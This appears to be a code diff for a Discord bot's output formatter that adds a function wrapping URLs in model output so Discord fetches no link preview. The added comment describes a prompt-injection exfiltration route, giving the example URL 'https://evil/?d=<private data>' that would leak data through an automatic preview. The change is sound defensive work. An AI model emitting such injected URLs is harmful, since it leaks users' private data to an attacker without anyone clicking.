@@ -8,6 +8,10 @@ no Discord I/O, so every rule here is tested without either.
 * Nothing Mylo writes can ping anyone: ``<@…>``, ``<@&…>``, ``@everyone`` and
   ``@here`` in model output are neutralised here, and every send also carries
   ``AllowedMentions.none()`` (the cog's job).
+* Discord unfurls a link in a bot message without anyone clicking it, so a
+  prompt-injected ``https://evil/?d=<private data>`` would leak through the
+  preview. Every URL the model writes is wrapped in ``<…>`` (no preview) by
+  :func:`defang_urls`, and the cog also sends with ``suppress_embeds=True``.
 * A citation (``#3``) is a masked link where it stands in the answer, with
   its embed suppressed (``<url>``). Only a source with nowhere to link to
   is listed under the answer, by title.
@@ -156,6 +160,37 @@ _CODE = re.compile(r"(```.*?(?:```|\Z)|`[^`\n]*`)", re.S)
 _CITE = re.compile(r"(?<![\w\[/#])#(\d+)\b(?!\]\()")
 
 
+#: A URL the model wrote, already wrapped (``<https://…>``) or bare.
+_URL = re.compile(r"<?\b[a-z][a-z0-9+.-]*://[^\s<>]+>?", re.I)
+_TRAILING = ".,;:!?'\"*_~"
+
+
+def _wrap(match: re.Match) -> str:
+    url = match.group(0)
+    if url.startswith("<") and url.endswith(">"):
+        return url  # already embed-free
+    url = url.lstrip("<").rstrip(">")
+    tail = ""
+    # punctuation (and an unbalanced ``)`` closing a masked link or a
+    # parenthesis) belongs to the sentence, not the URL
+    while url and (
+        url[-1] in _TRAILING or (url[-1] == ")" and url.count(")") > url.count("("))
+    ):
+        url, tail = url[:-1], url[-1] + tail
+    if "://" not in url or url.endswith("://"):
+        return match.group(0)
+    return f"<{url}>{tail}"
+
+
+def defang_urls(text: str) -> str:
+    """Every URL in model output wrapped in ``<…>``, so Discord shows it
+    without fetching a preview. A bare URL and a masked link's target
+    (``[t](https://…)``) are both wrapped; code is left as written (Discord
+    never previews a link inside code)."""
+    parts = _CODE.split(text or "")
+    return "".join(p if i % 2 else _URL.sub(_wrap, p) for i, p in enumerate(parts))
+
+
 def link_citations(text: str, sources: list[dict]) -> str:
     """Each ``#n`` the answer cites becomes a masked link to that source, in
     place, with its embed suppressed. Code is left as written."""
@@ -234,7 +269,7 @@ def answer_chunks(
     as links, then unlinked sources and the model line on the last chunk (or
     a chunk of their own)."""
     text, wants_links = take_links_mark(text)
-    body = split(link_citations(neutralise(text), sources)) or [
+    body = split(link_citations(defang_urls(neutralise(text)), sources)) or [
         "(Mylo had nothing to say.)"
     ]
     tail = "\n".join(
@@ -253,8 +288,8 @@ def answer_chunks(
 
 def question_text(question: dict) -> str:
     """An ``ask_user`` question in a DM, with its options as a list."""
-    text = neutralise(str(question.get("question") or ""))
-    options = [neutralise(str(o)) for o in question.get("options") or []]
+    text = defang_urls(neutralise(str(question.get("question") or "")))
+    options = [defang_urls(neutralise(str(o))) for o in question.get("options") or []]
     if options:
         text += "\n" + "\n".join(f"- {o}" for o in options[:5])
     return text[:LIMIT]
